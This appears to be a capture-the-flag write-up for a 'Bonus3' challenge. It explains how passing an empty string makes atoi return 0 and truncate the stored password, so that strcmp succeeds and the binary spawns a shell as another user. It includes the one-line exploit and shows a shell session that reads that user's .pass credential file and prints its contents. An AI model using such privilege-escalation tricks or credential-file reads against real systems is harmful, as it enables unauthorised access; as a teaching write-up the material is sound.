@@ -1,0 +1,118 @@
+# Bonus3 - File Read + strcmp Bypass
+
+## Context
+
+The program reads a password file and compares it with argv[1]. By passing an empty string, we exploit how `atoi("")` returns 0, which truncates the password at position 0 — making `strcmp` compare two empty strings.
+
+---
+
+## Program Flow
+
+```c
+main(argc, argv) :
+  local_14 = fopen("/home/user/end/.pass", "r")
+  fread(local_98, 1, 0x42, local_14)  // reads 66 bytes of password
+  local_57 = 0                         // null terminator
+  iVar2 = atoi(argv[1])               // converts argv[1] to int
+  local_98[iVar2] = '\0'              // truncates password at position iVar2
+  fread(local_56, 1, 0x41, local_14)  // reads more of file
+  fclose(local_14)
+  iVar2 = strcmp(local_98, argv[1])   // compares truncated password with argv[1]
+  if iVar2 == 0 :
+    execl("/bin/sh", "sh", 0)         // shell !
+  else :
+    puts(local_56)
+```
+
+---
+
+## The Vulnerability
+
+### atoi("") returns 0
+
+```c
+iVar2 = atoi(argv[1])    // atoi("") = 0
+local_98[0] = '\0'       // truncates password at position 0 !
+```
+
+When argv[1] is an empty string :
+
+```
+password read from file = "3321b6f81659f9a..."
+after truncation        = ""   ← position 0 set to \0 !
+```
+
+### strcmp compares two empty strings
+
+```c
+strcmp(local_98, argv[1])
+strcmp("", "")   // both are empty strings !
+→ returns 0      // strings are equal !
+→ execl("/bin/sh") ← shell !
+```
+
+---
+
+## Why This Works
+
+### Step by step
+
+```
+1. fread reads password into local_98
+   local_98 = "3321b6f81659f9a71c76616f606e..."
+
+2. atoi("") = 0
+   local_98[0] = '\0'
+   local_98 = ""   ← truncated to empty string !
+
+3. strcmp("", "")
+   → 0 → equal !
+
+4. execl("/bin/sh") → shell !
+```
+
+### Key insight
+
+```
+atoi("")  = 0         ← empty string converts to 0
+local_98[0] = '\0'    ← first byte of password set to null
+password  = ""        ← now an empty string
+argv[1]   = ""        ← also an empty string
+strcmp    = 0         ← equal → shell !
+```
+
+---
+
+## Final Payload
+
+```bash
+./bonus3 ""
+```
+
+Just pass an **empty string** as argv[1] !
+
+---
+
+## Full Execution Flow
+
+```
+1. fopen()    → opens /home/user/end/.pass
+2. fread()    → reads password into local_98
+3. atoi("")   → returns 0
+4. local_98[0] = '\0' → password truncated to ""
+5. strcmp("", "") → returns 0 → equal !
+6. execl("/bin/sh", "sh", 0)
+7. → shell !
+```
+
+---
+
+## Result
+
+```bash
+./bonus3 ""
+$ whoami
+end       ← shell obtained !
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
